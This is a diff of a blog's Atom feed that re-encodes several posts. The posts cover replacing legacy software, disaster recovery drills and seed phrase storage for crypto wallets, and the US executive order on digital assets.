+<p>The mycelium’s relationship with decay highlights the importance of continuously removing dead and old material to support growth and progress. In a similar way, deprecating and replacing legacy software with modern software built adhering to modern security standards can help improve software supply chain security by reducing the risk of vulnerabilities and attacks.</p>
 
-&lt;p&gt;Wallet owners will inevitably make tradeoffs between security and convenience, but this is par the course for making security decisions. Retaining your seed phrase is fundamental to maintaining access to your digital assets; therefore, protecting this seed phrase should be the top priority of a wallet’s owner.&lt;/p&gt;
+<p>In addition, modern software is updated regularly with security patches and new features, helping to keep systems secure and prevent security incidents. By replacing legacy software with modern software, organizations can take advantage of the latest security protocols and technologies, reducing the risk of cyberattacks and data breaches. This, in turn, helps to build trust in the software supply chain and ensures that sensitive information is protected from cyber threats. Overall, the benefits of modern software for software supply chain security are significant, and organizations that prioritize deprecating and replacing legacy software are well-positioned to protect their digital assets and maintain a strong security posture.</p>
 
-&lt;h4 id=&quot;back-up-private-keys&quot;&gt;Back-Up Private Keys&lt;/h4&gt;
+<h4 id="lesson-2-adapt-and-evolve">Lesson 2) Adapt and Evolve</h4>
 
-&lt;p&gt;Creating a backup of private keys is fundamental for creating a successful disaster recovery plan for digital assets. Wallets generate private keys using the seed phrase as input. Seed phrases and private keys aren’t the same, although both allow someone to spend coins in a wallet.&lt;/p&gt;
+<p>The mycelium’s ability to adapt and evolve in response to changes in its environment is a powerful example of resilience and the importance of continuous improvement. Deprecating and replacing legacy software with modern software built to meet today’s security standards can improve the resilience of the software supply chain and increase its ability to respond to changing threats and vulnerabilities.</p>
 
-&lt;p&gt;There are two main approaches for maintaining secure custody of private keys, depending on the responsible entity type:&lt;/p&gt;
+<p>Modern software is built to adhere to current security standards and is designed to address the latest security threats. For example, modern software may include features like encryption, multi-factor authentication, and firewalls to prevent unauthorized access to sensitive information. These features help to prevent cyberattacks and reduce the risk of data breaches.</p>
 
-&lt;ul&gt;
-  &lt;li&gt;For &lt;strong&gt;individual users&lt;/strong&gt;, store your private keys securely. The best practices for storing this data are comparable to the above guidelines for storing seed phrases. Utilizing a hardware wallet for long-term storage is the most secure option to mitigate the risk to your private keys.&lt;/li&gt;
-  &lt;li&gt;For &lt;strong&gt;institutions&lt;/strong&gt;, store private keys within a secure secret manager, such as &lt;a href=&quot;https://www.vaultproject.io/&quot;&gt;Vault&lt;/a&gt; or AWS Secrets Manager. Wallet custodians should treat these private keys like credentials and other secrets. To state the obvious: private keys, regardless of form, should never be stored in plain text internally nor on the blockchain.&lt;/li&gt;
-&lt;/ul&gt;
+<h4 id="lesson-3-support-growth-and-renewal">Lesson 3) Support Growth and Renewal</h4>
 
-&lt;h3 id=&quot;web-3-disaster-recovery-for-developers&quot;&gt;Web 3 Disaster Recovery For Developers:&lt;/h3&gt;
+<p>The mycelium’s role in breaking down dead and old material to support growth and renewal is similar to the role of deprecating and replacing legacy software in promoting software supply chain security. By removing older, unsupported software and replacing it with modern software built to meet current security standards, organizations can reduce their risk of attacks and increase their ability to respond to changing security threats. This can help ensure the long-term health and security of the software supply chain.</p>
 
-&lt;p&gt;Disasters affect developers too. Thus, it is in the best interest of developers who touch decentralized applications to have a well-thought-out, well-tested disaster recovery plan mapped out. For example, consider all the points of access developers need to take a dApp from code to deployment. Not only should developers take care to protect their wallets, but they should protect &lt;a href=&quot;https://www.preethikasireddy.com/post/the-architecture-of-a-web-3-0-application&quot;&gt;access to their code and deployment infrastructure&lt;/a&gt; and should develop a contingency plan to handle hacks and other business logic exploits which may come to light.&lt;/p&gt;
+<p>Deprecating and replacing legacy software with modern software built with modern security standards is critical for the security of the software supply chain. Legacy software systems, by their very nature, are vulnerable to exploitation due to outdated security protocols, lack of security updates, and other factors. These systems can easily become a target for cyberattacks, leading to data breaches, theft of sensitive information, and other security incidents.</p>]]></content><author><name></name></author><category term="blog" /><summary type="html"><![CDATA[Fungus plays a vital role in breaking down dead and old material in forests, and in a similar way, it can also help us learn to replace legacy software and eliminate tech debt. Just as fungus decomposes fallen trees and other organic matter, legacy software can be broken down and replaced with more modern and efficient alternatives.]]></summary></entry><entry><title type="html">Disaster Recovery Drills in Web 3.0</title><link href="http://localhost:4000/blog/disaster-recovery-drills-in-web-3" rel="alternate" type="text/html" title="Disaster Recovery Drills in Web 3.0" /><published>2022-06-12T00:00:00-07:00</published><updated>2022-06-12T00:00:00-07:00</updated><id>http://localhost:4000/blog/disaster-recovery-drills-web-3</id><content type="html" xml:base="http://localhost:4000/blog/disaster-recovery-drills-in-web-3"><![CDATA[<p>I spent several hours tracking down a small notebook earlier this week. The reason? I wrote down my seed phrases in this tiny notebook, which I carelessly tracked. Why am I telling you this? This management strategy is a horrible practice. Had I not performed a disaster recovery drill for my digital assets, I might’ve continued storing my seed phrase insecurely. Disaster recovery drills are foundational for security in web 3.0 and enable continued access to blockchain assets.</p>
 
-&lt;p&gt;An average deployment on leading blockchains &lt;a href=&quot;https://medium.com/scrappy-squirrels/estimating-smart-contract-costs-f65acf818c26&quot;&gt;can cost thousands of dollars&lt;/a&gt;. For this reason, organizations should protect developer access to deployed applications–this entails planning around the risk of developer lockout and enforcing access controls. Access restrictions implemented according to the &lt;a href=&quot;https://cycode.com/blog/using-the-principle-of-least-privilege-for-maximum-security/?utm_source=rss&amp;amp;utm_medium=rss&amp;amp;utm_campaign=using-the-principle-of-least-privilege-for-maximum-security&quot;&gt;principle of least privilege&lt;/a&gt; help ensure workflow recovery is possible–take steps to ensure you build with the ability to update, patch, and recover access to deployed smart contracts.&lt;/p&gt;
+<h2 id="web-3-wallet-security-basics">Web 3 Wallet Security Basics</h2>
 
-&lt;h4 id=&quot;handling-tech-debt&quot;&gt;Handling Tech Debt&lt;/h4&gt;
+<p>Securing your seed phrase is foundational to security because the seed phrase is the <a href="https://getcoinplate.com/blog/is-a-seed-phrase-the-same-as-a-private-key-the-ultimate-guide-to-private-keys-and-recovery-seed-phrases/">cryptographic basis for accessing the wallet</a>. The seed phrase represents a long string of random numbers — and your wallet uses it to generate the private keys that let you send and spend your crypto. Individuals and institutions should securely secure their wallet seed phrases in multiple locations and, ideally, partitioned. Without the seed phrase, wallet owners will have no recourse for recovering their wallets.</p>
 
-&lt;p&gt;In the same way that entropy is inevitable to any physical system, tech debt is a byproduct of the early, do-or-die stages of product development. Once the product has a bit of runway to work with, major refactors can be necessary to improve performance and address any other rickety implementations. This friction in the SDLC introduced by tech debt can lead to immediate and later insecurities if left uncorrected.&lt;/p&gt;
+<p>There are well-established standards for <a href="https://www.coinbase.com/learn/crypto-basics/what-is-a-seed-phrase">storing seed phrases</a>. The best practices boil down to:</p>
 
-&lt;p&gt;In addition, &lt;a href=&quot;https://en.wikipedia.org/wiki/Technical_debt&quot;&gt;tech debt&lt;/a&gt; can lead to churn that harms developer velocity. Continuously fighting with poorly implemented routines, wrangling complicated test cases, and deciphering unconventional logic takes a toll on productivity. Reimplementation comes with costs, but the learning acquired throughout the MVP development process often allows for higher quality. This refactoring can make it easier to add features and capabilities on top of existing applications.&lt;/p&gt;
+<ul>
+  <li>Store your seed phase in multiple locations.</li>
+  <li>Ensure access to your seed phrase is sufficiently restricted.</li>
+  <li>If feasible, <a href="https://bitcoin.stackexchange.com/questions/60540/practical-way-to-split-a-bip39-seed-into-a-2-out-of-3-factor-auth">only store parts of the seed phrase at any one site</a> to avoid a single point of compromise.</li>
+  <li>Factor in the possibility of a natural disaster–it may be worth creating etched plates to hold parts of a seed phrase rather than hoping pieces of paper survive a fire, flood, or other acts of g*d.</li>
+  <li>Memorize your seed phrase–you could get hit by a bus, but if you can find a hardware wallet in heaven, you’ll have access to your digital assets. (This is obviously a joke – crypto degens don’t go to heaven)</li>
+</ul>
 
-&lt;h4 id=&quot;security-training-and-assistance&quot;&gt;Security Training and Assistance&lt;/h4&gt;
+<p>Wallet owners will inevitably make tradeoffs between security and convenience, but this is par the course for making security decisions. Retaining your seed phrase is fundamental to maintaining access to your digital assets; therefore, protecting this seed phrase should be the top priority of a wallet’s owner.</p>
 
-&lt;p&gt;One of the best ways to help prevent security vulnerabilities from escaping to your smart contract or live dApp is to institute security training for developers. This security awareness is especially pertinent for developers of exchanges and other DeFi applications, especially since &lt;a href=&quot;https://arstechnica.com/information-technology/2021/12/hackers-drain-31-million-from-cryptocurrency-service-monox-finance/&quot;&gt;exploitable bugs can appear in the smart contracts&lt;/a&gt;, and the &lt;a href=&quot;https://forkbomb.io/blog/pastejacking-smart-contracts&quot;&gt;dApp frontend provides an additional attack surface&lt;/a&gt; if not carefully guarded.&lt;/p&gt;
+<h4 id="back-up-private-keys">Back-Up Private Keys</h4>
 
-&lt;p&gt;To improve the security of applications interacting with payment card data, PCI DSS 6.5 requirements state that the developers must receive regular security training at least once a year. Though &lt;a href=&quot;https://forkbomb.io/blog/crypto-executive-order-explained&quot;&gt;regulation on digital assets is still underway&lt;/a&gt;, organizations will see the benefits of providing basic security training to developers in terms of time saved resolving bugs and other vulnerabilities.&lt;/p&gt;
+<p>Creating a backup of private keys is fundamental for creating a successful disaster recovery plan for digital assets. Wallets generate private keys using the seed phrase as input. Seed phrases and private keys aren’t the same, although both allow someone to spend coins in a wallet.</p>
 
-&lt;p&gt;One may even recommend solutions that entail &lt;a href=&quot;https://cycode.com/blog/cycode-workflows/&quot;&gt;automated remediation&lt;/a&gt; as a solution, as a means of maximizing the time saved–such tools can even help train developers to support improvements to an organization’s security posture.&lt;/p&gt;
+<p>There are two main approaches for maintaining secure custody of private keys, depending on the responsible entity type:</p>
 
-&lt;p&gt;&lt;strong&gt;Bottom line: Ensure sufficient security training for developers and foster a culture of pride in the quality, and it’ll pay off both figuratively and literally.&lt;/strong&gt;&lt;/p&gt;
+<ul>
+  <li>For <strong>individual users</strong>, store your private keys securely. The best practices for storing this data are comparable to the above guidelines for storing seed phrases. Utilizing a hardware wallet for long-term storage is the most secure option to mitigate the risk to your private keys.</li>
+  <li>For <strong>institutions</strong>, store private keys within a secure secret manager, such as <a href="https://www.vaultproject.io/">Vault</a> or AWS Secrets Manager. Wallet custodians should treat these private keys like credentials and other secrets. To state the obvious: private keys, regardless of form, should never be stored in plain text internally nor on the blockchain.</li>
+</ul>
 
-&lt;h2 id=&quot;recovery-drills-for-cryptocurrencies-and-digital-assets&quot;&gt;Recovery Drills for Cryptocurrencies and Digital Assets&lt;/h2&gt;
+<h3 id="web-3-disaster-recovery-for-developers">Web 3 Disaster Recovery For Developers:</h3>
 
-&lt;p&gt;There’s no stand-in for actual disaster recovery practice. Developers should undergo manual wallet recovery training to practice saving digital assets since there are no second chances when it comes to cryptographic assets. Though &lt;a href=&quot;forkbomb.io&quot;&gt;new digital asset regulation&lt;/a&gt; has been hinted at to help mitigate the risks imposed by cryptocurrencies, &lt;a href=&quot;https://forkbomb.io/blog/maximizing-the-benefit-and-utility-of-minting-nfts&quot;&gt;NFTs&lt;/a&gt;, and other assets tied to cryptographic wallets, early adopters are still mainly on their own regarding the security of their assets.&lt;/p&gt;
+<p>Disasters affect developers too. Thus, it is in the best interest of developers who touch decentralized applications to have a well-thought-out, well-tested disaster recovery plan mapped out. For example, consider all the points of access developers need to take a dApp from code to deployment. Not only should developers take care to protect their wallets, but they should protect <a href="https://www.preethikasireddy.com/post/the-architecture-of-a-web-3-0-application">access to their code and deployment infrastructure</a> and should develop a contingency plan to handle hacks and other business logic exploits which may come to light.</p>
 
-&lt;p&gt;Even after regulation hits, every wallet owner should create and test a plan for their digital asset recovery–it’s the best way to ensure the success of a contingency plan–just make sure you don’t lock yourself out while testing.&lt;/p&gt;
+<p>An average deployment on leading blockchains <a href="https://medium.com/scrappy-squirrels/estimating-smart-contract-costs-f65acf818c26">can cost thousands of dollars</a>. For this reason, organizations should protect developer access to deployed applications–this entails planning around the risk of developer lockout and enforcing access controls. Access restrictions implemented according to the <a href="https://cycode.com/blog/using-the-principle-of-least-privilege-for-maximum-security/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=using-the-principle-of-least-privilege-for-maximum-security">principle of least privilege</a> help ensure workflow recovery is possible–take steps to ensure you build with the ability to update, patch, and recover access to deployed smart contracts.</p>
 
-&lt;p&gt;Cyber-attacks have hit &lt;a href=&quot;https://www.hedgewithcrypto.com/cryptocurrency-exchange-hacks/&quot;&gt;crypto exchanges&lt;/a&gt;, &lt;a href=&quot;https://mirror.xyz/infinitesn4ke.eth/xSu1ssilKkKQocyHABHrs5CWATwJN89EwqQ1fGkeT94&quot;&gt;dApps&lt;/a&gt;, and other web 3 projects. The Architectural &amp;amp; Security Initiatives for Decentralized Software Security Framework (ACID-SF) is an &lt;a href=&quot;https://mirror.xyz/infinitesn4ke.eth/KpvzZHbpXuQEsmz9C30dmdhI7Xv6QFZ1nxBgt12GXu8&quot;&gt;experimental cybersecurity framework designed to help improve web 3.0 project security&lt;/a&gt;. The ultimate goal of this framework is to enable project stakeholders to make more informed cybersecurity decisions.&lt;/p&gt;</content><author><name></name></author><category term="blog" /><summary type="html">I spent several hours tracking down a small notebook earlier this week. The reason? I wrote down my seed phrases in this tiny notebook, which I carelessly tracked. Why am I telling you this? This management strategy is a horrible practice. Had I not performed a disaster recovery drill for my digital assets, I might’ve continued storing my seed phrase insecurely. Disaster recovery drills are foundational for security in web 3.0 and enable continued access to blockchain assets.</summary></entry><entry><title type="html">Crypto Executive Order Explained</title><link href="http://localhost:4000/blog/crypto-executive-order-explained" rel="alternate" type="text/html" title="Crypto Executive Order Explained" /><published>2022-05-02T00:00:00-07:00</published><updated>2022-05-02T00:00:00-07:00</updated><id>http://localhost:4000/blog/crypto-executive-order-explained</id><content type="html" xml:base="http://localhost:4000/blog/crypto-executive-order-explained">&lt;p&gt;Cryptocurrency has seen dramatic growth since its inception in 2009. Around 16% of American adults have invested in cryptocurrencies. In theme with prior executive orders advancing US cyber policy, the White House recently signed &lt;a href=&quot;https://www.whitehouse.gov/briefing-room/statements-releases/2022/03/09/fact-sheet-president-biden-to-sign-executive-order-on-ensuring-responsible-innovation-in-digital-assets/&quot;&gt;an executive order on cryptocurrencies and other digital assets&lt;/a&gt;. Crypto enthusiasts view this as a win, but what does ensuring the responsible development of digital asset mean for the average American?&lt;/p&gt;
+<h4 id="handling-tech-debt">Handling Tech Debt</h4>
 
-&lt;h2 id=&quot;key-measures-of-the-executive-order&quot;&gt;Key Measures of the Executive Order&lt;/h2&gt;
+<p>In the same way that entropy is inevitable to any physical system, tech debt is a byproduct of the early, do-or-die stages of product development. Once the product has a bit of runway to work with, major refactors can be necessary to improve performance and address any other rickety implementations. This friction in the SDLC introduced by tech debt can lead to immediate and later insecurities if left uncorrected.</p>
 
-&lt;p&gt;Biden’s Executive Order entails several vital measures to help harness the potential benefits of crypto, blockchain, and other digital assets.&lt;/p&gt;
+<p>In addition, <a href="https://en.wikipedia.org/wiki/Technical_debt">tech debt</a> can lead to churn that harms developer velocity. Continuously fighting with poorly implemented routines, wrangling complicated test cases, and deciphering unconventional logic takes a toll on productivity. Reimplementation comes with costs, but the learning acquired throughout the MVP development process often allows for higher quality. This refactoring can make it easier to add features and capabilities on top of existing applications.</p>
 
-&lt;ul&gt;
-  &lt;li&gt;Protect U.S. Consumers, Investors, and Businesses&lt;/li&gt;
-&lt;/ul&gt;
+<h4 id="security-training-and-assistance">Security Training and Assistance</h4>
 
-&lt;p&gt;The stated protection entails developing an official policy to address systemic economic risks introduced by cryptocurrency. This entails developing regulatory measures for decentralized applications. Recent &lt;a href=&quot;https://www.sec.gov/news/press-release/2022-78&quot;&gt;announcements from the SEC&lt;/a&gt; demonstrate that they are aware of the threats to investors and developers that exist because of &lt;a href=&quot;https://www.sec.gov/oiea/investor-alerts-and-bulletins/digital-asset-and-crypto-investment-scams-investor-alert&quot;&gt;rugpulls&lt;/a&gt; and other forms of scam.&lt;/p&gt;
+<p>One of the best ways to help prevent security vulnerabilities from escaping to your smart contract or live dApp is to institute security training for developers. This security awareness is especially pertinent for developers of exchanges and other DeFi applications, especially since <a href="https://arstechnica.com/information-technology/2021/12/hackers-drain-31-million-from-cryptocurrency-service-monox-finance/">exploitable bugs can appear in the smart contracts</a>, and the <a href="https://forkbomb.io/blog/pastejacking-smart-contracts">dApp frontend provides an additional attack surface</a> if not carefully guarded.</p>
 
-&lt;ul&gt;
-  &lt;li&gt;Protect the U.S. and Global Financial Stability and Mitigate Systemic Risk&lt;/li&gt;
-&lt;/ul&gt;
+<p>To improve the security of applications interacting with payment card data, PCI DSS 6.5 requirements state that the developers must receive regular security training at least once a year. Though <a href="https://forkbomb.io/blog/crypto-executive-order-explained">regulation on digital assets is still underway</a>, organizations will see the benefits of providing basic security training to developers in terms of time saved resolving bugs and other vulnerabilities.</p>
 
-&lt;p&gt;The Financial Stability Council will identify systemic financial risks imposed by crypto and develop policy to help mitigate identified risks. This includes risk related to moral hazard, the lack of know-your-customer controls, and other dangers introduced by the crypto ecosystem.&lt;/p&gt;
+<p>One may even recommend solutions that entail <a href="https://cycode.com/blog/cycode-workflows/">automated remediation</a> as a solution, as a means of maximizing the time saved–such tools can even help train developers to support improvements to an organization’s security posture.</p>
 
-&lt;ul&gt;
-  &lt;li&gt;Mitigate the Illicit Finance and National Security Risks Posed by the Illicit Use of Digital Assets&lt;/li&gt;
-&lt;/ul&gt;
+<p><strong>Bottom line: Ensure sufficient security training for developers and foster a culture of pride in the quality, and it’ll pay off both figuratively and literally.</strong></p>
 
-&lt;p&gt;Both the beauty and the dangers of crypto lie in its ability to transfer money without a central authority. Many have gained the change to leave oppressive regimes, safely fund activism, and perform reanactments of &lt;em&gt;Fear and Loathing&lt;/em&gt;, however, cryptocurrency has also provided a route for funding terrorism. Mitigating the risks imposed by will only be possible with unity. This executive order pushes for federal policy and international policy to be developed and enforced.&lt;/p&gt;
+<h2 id="recovery-drills-for-cryptocurrencies-and-digital-assets">Recovery Drills for Cryptocurrencies and Digital Assets</h2>
 
-&lt;ul&gt;
-  &lt;li&gt;Promote U.S. Leadership in Technology and Economic Competitiveness to Reinforce U.S. Leadership in the Global Financial System&lt;/li&gt;
-&lt;/ul&gt;
+<p>There’s no stand-in for actual disaster recovery practice. Developers should undergo manual wallet recovery training to practice saving digital assets since there are no second chances when it comes to cryptographic assets. Though <a href="forkbomb.io">new digital asset regulation</a> has been hinted at to help mitigate the risks imposed by cryptocurrencies, <a href="https://forkbomb.io/blog/maximizing-the-benefit-and-utility-of-minting-nfts">NFTs</a>, and other assets tied to cryptographic wallets, early adopters are still mainly on their own regarding the security of their assets.</p>
 
-&lt;p&gt;This executive order directs the Department of Commerce to develop a framework to help promote research and secure the development of industry-leading solutions involving digital assets. This rapid-development framework will serve as a foundation for agencies and integrate this as a priority into their policy, research and development, and operational approaches to digital assets.&lt;/p&gt;
+<p>Even after regulation hits, every wallet owner should create and test a plan for their digital asset recovery–it’s the best way to ensure the success of a contingency plan–just make sure you don’t lock yourself out while testing.</p>
 
-&lt;ul&gt;
-  &lt;li&gt;Promote Equitable Access to Safe and Affordable Financial Services&lt;/li&gt;
-&lt;/ul&gt;
+<p>Cyber-attacks have hit <a href="https://www.hedgewithcrypto.com/cryptocurrency-exchange-hacks/">crypto exchanges</a>, <a href="https://mirror.xyz/infinitesn4ke.eth/xSu1ssilKkKQocyHABHrs5CWATwJN89EwqQ1fGkeT94">dApps</a>, and other web 3 projects. The Architectural &amp; Security Initiatives for Decentralized Software Security Framework (ACID-SF) is an <a href="https://mirror.xyz/infinitesn4ke.eth/KpvzZHbpXuQEsmz9C30dmdhI7Xv6QFZ1nxBgt12GXu8">experimental cybersecurity framework designed to help improve web 3.0 project security</a>. The ultimate goal of this framework is to enable project stakeholders to make more informed cybersecurity decisions.</p>]]></content><author><name></name></author><category term="blog" /><summary type="html"><![CDATA[I spent several hours tracking down a small notebook earlier this week. The reason? I wrote down my seed phrases in this tiny notebook, which I carelessly tracked. Why am I telling you this? This management strategy is a horrible practice. Had I not performed a disaster recovery drill for my digital assets, I might’ve continued storing my seed phrase insecurely. Disaster recovery drills are foundational for security in web 3.0 and enable continued access to blockchain assets.]]></summary></entry><entry><title type="html">Crypto Executive Order Explained</title><link href="http://localhost:4000/blog/crypto-executive-order-explained" rel="alternate" type="text/html" title="Crypto Executive Order Explained" /><published>2022-05-02T00:00:00-07:00</published><updated>2022-05-02T00:00:00-07:00</updated><id>http://localhost:4000/blog/crypto-executive-order-explained</id><content type="html" xml:base="http://localhost:4000/blog/crypto-executive-order-explained"><![CDATA[<p>Cryptocurrency has seen dramatic growth since its inception in 2009. Around 16% of American adults have invested in cryptocurrencies. In theme with prior executive orders advancing US cyber policy, the White House recently signed <a href="https://www.whitehouse.gov/briefing-room/statements-releases/2022/03/09/fact-sheet-president-biden-to-sign-executive-order-on-ensuring-responsible-innovation-in-digital-assets/">an executive order on cryptocurrencies and other digital assets</a>. Crypto enthusiasts view this as a win, but what does ensuring the responsible development of digital asset mean for the average American?</p>
 
-&lt;p&gt;Crypto has made financial services more accessible, allowing access to those disenfranchised or otherwise excluded from traditional banking systems. However, this lack of &lt;a href=&quot;https://www.swift.com/your-needs/financial-crime-cyber-security/know-your-customer-kyc/meaning-kyc#:~:text=illicit%20criminal%20activities.-,Know%20Your%20Customer%20(KYC)%20standards%20are%20designed%20to%20protect%20financial,of%20funds%20is%20legitimate%3B%20and&quot;&gt;Know your Customer&lt;/a&gt; controls introduces systemic risk.&lt;/p&gt;
+<h2 id="key-measures-of-the-executive-order">Key Measures of the Executive Order</h2>
 
-&lt;p&gt;Allowing the otherwise unbanked access to crypto services is important to supporting equity within the crypto space, which the executive order seems aware of.&lt;/p&gt;
+<p>Biden’s Executive Order entails several vital measures to help harness the potential benefits of crypto, blockchain, and other digital assets.</p>
 
-&lt;ul&gt;
-  &lt;li&gt;Support Technological Advances and Ensure Responsible Development and Use of Digital Assets&lt;/li&gt;
-&lt;/ul&gt;
+<ul>
+  <li>Protect U.S. Consumers, Investors, and Businesses</li>
+</ul>
 
-&lt;p&gt;The U.S. Government will take concrete steps to study and support technological advances in the responsible development, design, and implementation of digital asset systems. Their prerogative prioritizes instilling privacy and security into the management of digital assets while combating illicit exploitation.&lt;/p&gt;
+<p>The stated protection entails developing an official policy to address systemic economic risks introduced by cryptocurrency. This entails developing regulatory measures for decentralized applications. Recent <a href="https://www.sec.gov/news/press-release/2022-78">announcements from the SEC</a> demonstrate that they are aware of the threats to investors and developers that exist because of <a href="https://www.sec.gov/oiea/investor-alerts-and-bulletins/digital-asset-and-crypto-investment-scams-investor-alert">rugpulls</a> and other forms of scam.</p>
 
-&lt;p&gt;Part of the stated responsibility of the US government is to reduce the negative climate impacts of digital assets. This may include investment in more &lt;a href=&quot;https://www.nytimes.com/2021/10/10/business/dealbook/crypto-climate.html&quot;&gt;ecologically sustainable energy sources&lt;/a&gt; to help power the infrastructure and proof-of-work calculations linked to cryptographically provable assets.&lt;/p&gt;
+<ul>
+  <li>Protect the U.S. and Global Financial Stability and Mitigate Systemic Risk</li>
+</ul>
 
-&lt;ul&gt;
-  &lt;li&gt;Explore a U.S. Central Bank Digital Currency&lt;/li&gt;
-&lt;/ul&gt;
+<p>The Financial Stability Council will identify systemic financial risks imposed by crypto and develop policy to help mitigate identified risks. This includes risk related to moral hazard, the lack of know-your-customer controls, and other dangers introduced by the crypto ecosystem.</p>
 
-&lt;p&gt;Exploring the potential establishment of a digital form of the fiat US dollar is the final key measure of the executive order. The &lt;a href=&quot;https://www.federalreserve.gov/central-bank-digital-currency.htm&quot;&gt;Federal Reserve shall throughly research&lt;/a&gt; the prospects of establishing a national currency; should it make sense and be deemed in the nation’s best interest, the US shall move forward in developing a CBDC.&lt;/p&gt;
+<ul>
+  <li>Mitigate the Illicit Finance and National Security Risks Posed by the Illicit Use of Digital Assets</li>
+</ul>
 
-&lt;h2 id=&quot;the-future-of-ensuring-responsible-development-of-digital-assets&quot;&gt;The Future of Ensuring Responsible Development of Digital Assets&lt;/h2&gt;
+<p>Both the beauty and the dangers of crypto lie in its ability to transfer money without a central authority. Many have gained the change to leave oppressive regimes, safely fund activism, and perform reanactments of <em>Fear and Loathing</em>, however, cryptocurrency has also provided a route for funding terrorism. Mitigating the risks imposed by will only be possible with unity. This executive order pushes for federal policy and international policy to be developed and enforced.</p>
 
-&lt;p&gt;This executive order is more descriptive than prescriptive, falling in line with guidelines such as the &lt;a href=&quot;https://cycode.com/blog/nist-ssdf-explained/&quot;&gt;NIST SSDF&lt;/a&gt;. As the key measures are explored and mature, we can expect guidance to take a more solid form.&lt;/p&gt;
+<ul>
+  <li>Promote U.S. Leadership in Technology and Economic Competitiveness to Reinforce U.S. Leadership in the Global Financial System</li>
+</ul>
 
-&lt;p&gt;Often, the patterns of the past give clues about the future. The 1913 Federal Reserve Act, passed in the wake of the turn of the century banking crises, created the current Federal Reserve System and introduced a central bank to oversee U.S. monetary policy. This policy was deemed necessary because of the inability of the market to achieve stability in a laissez-faire environment.&lt;/p&gt;
+<p>This executive order directs the Department of Commerce to develop a framework to help promote research and secure the development of industry-leading solutions involving digital assets. This rapid-development framework will serve as a foundation for agencies and integrate this as a priority into their policy, research and development, and operational approaches to digital assets.</p>
 
-&lt;p&gt;Historians may compare Biden’s executive order on crypto to the monetary policies introduced a century ago. The most significant impact of this executive order will be the introduction of compliance standards and regulations design to hold institutions accountable.&lt;/p&gt;
+<ul>
+  <li>Promote Equitable Access to Safe and Affordable Financial Services</li>
+</ul>
 
-&lt;p&gt;While the introduction of crypto compliance standards may shock current digital asset service providers, this will also increase the number of older institutions that choose to enter the blockchain asset space. &lt;a href=&quot;https://tokenpost.com/American-consumers-want-Bitcoin-BTC-and-crypto-related-services-from-their-banks-8240&quot;&gt;With 32% of crypto owners&lt;/a&gt; stating they would consider crypto services provided directly through their banks, these banks have an incentive to dip their toes into offering cryptocurrency amenities.&lt;/p&gt;
+<p>Crypto has made financial services more accessible, allowing access to those disenfranchised or otherwise excluded from traditional banking systems. However, this lack of <a href="https://www.swift.com/your-needs/financial-crime-cyber-security/know-your-customer-kyc/meaning-kyc#:~:text=illicit%20criminal%20activities.-,Know%20Your%20Customer%20(KYC)%20standards%20are%20designed%20to%20protect%20financial,of%20funds%20is%20legitimate%3B%20and">Know your Customer</a> controls introduces systemic risk.</p>
 
-&lt;h3 id=&quot;navigating-todays-crypto-landscape&quot;&gt;Navigating Today’s Crypto Landscape&lt;/h3&gt;
+<p>Allowing the otherwise unbanked access to crypto services is important to supporting equity within the crypto space, which the executive order seems aware of.</p>
 
-&lt;p&gt;In the long run, the introduction of compliance standards will improve the accessibility of crypto and provide more protections for everyday users. However, we do not yet have outlined best practices available for web 3 development, which puts this ecosystem at heightened risk.&lt;/p&gt;
+<ul>
+  <li>Support Technological Advances and Ensure Responsible Development and Use of Digital Assets</li>
+</ul>
 
-&lt;p&gt;For individual asset holders, the optimal approach is to follow defacto best practices for digital asset security. These practices include:&lt;/p&gt;
+<p>The U.S. Government will take concrete steps to study and support technological advances in the responsible development, design, and implementation of digital asset systems. Their prerogative prioritizes instilling privacy and security into the management of digital assets while combating illicit exploitation.</p>
 
-&lt;ul&gt;
-  &lt;li&gt;Performing disaster recovery drills for hot, cold, and paper wallets.&lt;/li&gt;
-  &lt;li&gt;Preventing physical access to hardware wallets.&lt;/li&gt;
-  &lt;li&gt;Utilizing 2FA or MFA for authentication.&lt;/li&gt;
-  &lt;li&gt;Maintaining separate hot wallet(s) for daily transactions while storing the rest of your crypto assets in a cold wallet(s).&lt;/li&gt;
-  &lt;li&gt;Staying vigilant against socially engineered attacks, such as phishing emails, &lt;a href=&quot;https://forkbomb.io/blog/pastejacking-smart-contracts&quot;&gt;pastejacking attacks&lt;/a&gt;, and malicious ads.&lt;/li&gt;
-&lt;/ul&gt;
+<p>Part of the stated responsibility of the US government is to reduce the negative climate impacts of digital assets. This may include investment in more <a href="https://www.nytimes.com/2021/10/10/business/dealbook/crypto-climate.html">ecologically sustainable energy sources</a> to help power the infrastructure and proof-of-work calculations linked to cryptographically provable assets.</p>
 
-&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
+<ul>
+  <li>Explore a U.S. Central Bank Digital Currency</li>
+</ul>
 
-&lt;p&gt;This executive order demonstrates that necessary investigations are underway regarding how we can utilize blockchain technologies to maximize societal benefit. These compliance requirements will hopefully push web 3 builders to adopt secure practices in their application development and deployment processes.&lt;/p&gt;</content><author><name></name></author><category term="blog" /><summary type="html">Cryptocurrency has seen dramatic growth since its inception in 2009. Around 16% of American adults have invested in cryptocurrencies. In theme with prior executive orders advancing US cyber policy, the White House recently signed an executive order on cryptocurrencies and other digital assets. Crypto enthusiasts view this as a win, but what does ensuring the responsible development of digital asset mean for the average American?</summary></entry><entry><title type="html">Maximizing the Benefit and Utility of Minting NFTs</title><link href="http://localhost:4000/blog/maximizing-the-benefit-and-utility-of-minting-nfts" rel="alternate" type="text/html" title="Maximizing the Benefit and Utility of Minting NFTs" /><published>2022-03-13T00:00:00-08:00</published><updated>2022-03-13T00:00:00-08:00</updated><id>http://localhost:4000/blog/maximizing-the-benefit-and-utility-of-minting-nfts</id><content type="html" xml:base="http://localhost:4000/blog/maximizing-the-benefit-and-utility-of-minting-nfts">&lt;p&gt;NFTs have been a hot trend in tech but face criticism regarding their lack of obvious utility. I started this off as a vent post for my frustration regarding the current discourse around NFTs. Still, I decided about midway through that energy might be better spent trying to help answer the pertinent questions: What are the benefits of minting NFTs, and how can we maximize the utility of NFTs?&lt;/p&gt;
+<p>Exploring the potential establishment of a digital form of the fiat US dollar is the final key measure of the executive order. The <a href="https://www.federalreserve.gov/central-bank-digital-currency.htm">Federal Reserve shall throughly research</a> the prospects of establishing a national currency; should it make sense and be deemed in the nation’s best interest, the US shall move forward in developing a CBDC.</p>
 
